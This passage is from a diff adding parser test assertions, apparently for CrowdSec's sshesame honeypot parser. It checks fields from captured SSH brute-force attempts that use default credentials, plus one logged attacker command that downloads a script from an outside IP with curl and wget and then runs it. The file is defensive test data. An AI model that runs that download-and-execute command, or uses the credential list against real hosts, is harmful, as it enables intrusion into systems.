+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][5].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][6].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][6].Evt.Parsed["sshesame_password"] == "support"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][6].Evt.Parsed["sshesame_user"] == "support"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][6].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][6].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58738] authentication for user \"support\" with password \"support\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][6].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][6].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][6].Evt.Meta["timestamp"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][6].Evt.Meta["username"] == "support"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][6].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][6].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][6].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][6].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][6].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][6].Evt.Meta["target_user"] == "support"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][6].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][7].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][7].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][7].Evt.Parsed["sshesame_password"] == "test"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][7].Evt.Parsed["sshesame_user"] == "test"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][7].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][7].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58932] authentication for user \"test\" with password \"test\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][7].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][7].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][7].Evt.Meta["target_user"] == "test"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][7].Evt.Meta["timestamp"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][7].Evt.Meta["username"] == "test"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][7].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][7].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][7].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][7].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][7].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][8].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][8].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58750] authentication for user \"user\" with password \"user\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][8].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][8].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][8].Evt.Parsed["sshesame_password"] == "user"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][8].Evt.Parsed["sshesame_user"] == "user"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][8].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][8].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][8].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][8].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][8].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][8].Evt.Meta["target_user"] == "user"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][8].Evt.Meta["timestamp"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][8].Evt.Meta["username"] == "user"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][8].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][8].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][9].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][9].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59078] authentication for user \"admin\" with password \"admin1234\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][9].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][9].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][9].Evt.Parsed["sshesame_password"] == "admin1234"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][9].Evt.Parsed["sshesame_user"] == "admin"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][9].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][9].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][9].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][9].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][9].Evt.Meta["target_user"] == "admin"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][9].Evt.Meta["timestamp"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][9].Evt.Meta["username"] == "admin"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][9].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][9].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][9].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][10].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][10].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59114] [channel 0] command \"cd /tmp; rm -rf wget*; curl -O http://45.95.55.24/wget.sh; wget http://45.95.55.24/wget.sh; chmod 777 wget.sh; ./wget.sh\" requested"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][10].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][10].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][10].Evt.Parsed["sshesame_cmd"] == "cd /tmp; rm -rf wget*; curl -O http://45.95.55.24/wget.sh; wget http://45.95.55.24/wget.sh; chmod 777 wget.sh; ./wget.sh"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][10].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][10].Evt.Meta["command"] == "cd /tmp; rm -rf wget*; curl -O http://45.95.55.24/wget.sh; wget http://45.95.55.24/wget.sh; chmod 777 wget.sh; ./wget.sh"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][10].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][10].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][10].Evt.Meta["log_type"] == "sshesame_cmd"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][10].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][10].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][10].Evt.Meta["timestamp"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][10].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][11].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][11].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58820] authentication for user \"root\" with password \"123456\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][11].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][11].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][11].Evt.Parsed["sshesame_password"] == "123456"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][11].Evt.Parsed["sshesame_user"] == "root"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][11].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][11].Evt.Meta["username"] == "root"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][11].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][11].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][11].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][11].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][11].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][11].Evt.Meta["target_user"] == "root"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][11].Evt.Meta["timestamp"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][11].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][12].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][12].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][12].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58704] authentication for user \"ubnt\" with password \"ubnt\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][12].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][12].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][12].Evt.Parsed["sshesame_password"] == "ubnt"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][12].Evt.Parsed["sshesame_user"] == "ubnt"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][12].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][12].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][12].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][12].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][12].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][12].Evt.Meta["target_user"] == "ubnt"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][12].Evt.Meta["timestamp"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][12].Evt.Meta["username"] == "ubnt"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][12].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][13].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][13].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][13].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][13].Evt.Parsed["sshesame_password"] == "raspberry"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][13].Evt.Parsed["sshesame_user"] == "pi"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][13].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][13].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58998] authentication for user \"pi\" with password \"raspberry\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][13].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][13].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][13].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][13].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][13].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][13].Evt.Meta["target_user"] == "pi"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][13].Evt.Meta["timestamp"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][13].Evt.Meta["username"] == "pi"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][13].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][14].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][14].Evt.Parsed["sshesame_user"] == "ubuntu"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][14].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][14].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59228] authentication for user \"ubuntu\" with password \"ubuntu\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][14].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][14].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][14].Evt.Parsed["sshesame_password"] == "ubuntu"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][14].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][14].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][14].Evt.Meta["target_user"] == "ubuntu"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][14].Evt.Meta["timestamp"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][14].Evt.Meta["username"] == "ubuntu"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][14].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][14].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][14].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][14].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][15].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][15].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58836] authentication for user \"daemon\" with password \"daemon\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][15].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][15].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][15].Evt.Parsed["sshesame_password"] == "daemon"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][15].Evt.Parsed["sshesame_user"] == "daemon"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][15].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][15].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][15].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][15].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][15].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][15].Evt.Meta["target_user"] == "daemon"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][15].Evt.Meta["timestamp"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][15].Evt.Meta["username"] == "daemon"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][15].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][15].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][16].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][16].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][16].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58776] authentication for user \"guest\" with password \"guest\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][16].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][16].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][16].Evt.Parsed["sshesame_password"] == "guest"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][16].Evt.Parsed["sshesame_user"] == "guest"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][16].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][16].Evt.Meta["target_user"] == "guest"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][16].Evt.Meta["timestamp"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][16].Evt.Meta["username"] == "guest"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][16].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][16].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][16].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][16].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][16].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][17].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][17].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][17].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][17].Evt.Parsed["sshesame_password"] == "minecraft"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][17].Evt.Parsed["sshesame_user"] == "minecraft"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][17].Evt.Parsed["timestamp"] == "2022/04/16 20:45:49"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][17].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59134] authentication for user \"minecraft\" with password \"minecraft\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][17].Evt.Meta["timestamp"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][17].Evt.Meta["username"] == "minecraft"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][17].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][17].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][17].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][17].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][17].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][17].Evt.Meta["target_user"] == "minecraft"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][17].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:49Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][18].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][18].Evt.Parsed["message"] == "2022/04/16 20:45:50 [64.31.47.254:58852] authentication for user \"telnet\" with password \"telnet\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][18].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][18].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][18].Evt.Parsed["sshesame_password"] == "telnet"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][18].Evt.Parsed["sshesame_user"] == "telnet"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][18].Evt.Parsed["timestamp"] == "2022/04/16 20:45:50"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][18].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][18].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][18].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][18].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][18].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][18].Evt.Meta["target_user"] == "telnet"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][18].Evt.Meta["timestamp"] == "2022-04-16T20:45:50Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][18].Evt.Meta["username"] == "telnet"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][18].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:50Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][19].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][19].Evt.Parsed["sshesame_user"] == "admin"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][19].Evt.Parsed["timestamp"] == "2022/04/16 20:45:50"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][19].Evt.Parsed["message"] == "2022/04/16 20:45:50 [64.31.47.254:59024] authentication for user \"admin\" with password \"admin123\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][19].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][19].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][19].Evt.Parsed["sshesame_password"] == "admin123"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][19].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][19].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][19].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][19].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][19].Evt.Meta["target_user"] == "admin"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][19].Evt.Meta["timestamp"] == "2022-04-16T20:45:50Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][19].Evt.Meta["username"] == "admin"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][19].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][19].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:50Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][20].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][20].Evt.Parsed["message"] == "2022/04/16 20:45:50 [64.31.47.254:59086] authentication for user \"admin\" with password \"admin\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][20].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][20].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][20].Evt.Parsed["sshesame_password"] == "admin"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][20].Evt.Parsed["sshesame_user"] == "admin"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][20].Evt.Parsed["timestamp"] == "2022/04/16 20:45:50"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][20].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][20].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][20].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][20].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][20].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][20].Evt.Meta["target_user"] == "admin"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][20].Evt.Meta["timestamp"] == "2022-04-16T20:45:50Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][20].Evt.Meta["username"] == "admin"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][20].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:50Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][21].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][21].Evt.Parsed["sshesame_user"] == "usuario"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][21].Evt.Parsed["timestamp"] == "2022/04/16 20:45:51"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][21].Evt.Parsed["message"] == "2022/04/16 20:45:51 [64.31.47.254:58734] authentication for user \"usuario\" with password \"usuario\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][21].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][21].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][21].Evt.Parsed["sshesame_password"] == "usuario"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][21].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][21].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][21].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][21].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][21].Evt.Meta["target_user"] == "usuario"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][21].Evt.Meta["timestamp"] == "2022-04-16T20:45:51Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][21].Evt.Meta["username"] == "usuario"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][21].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][21].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:51Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][22].Success == true
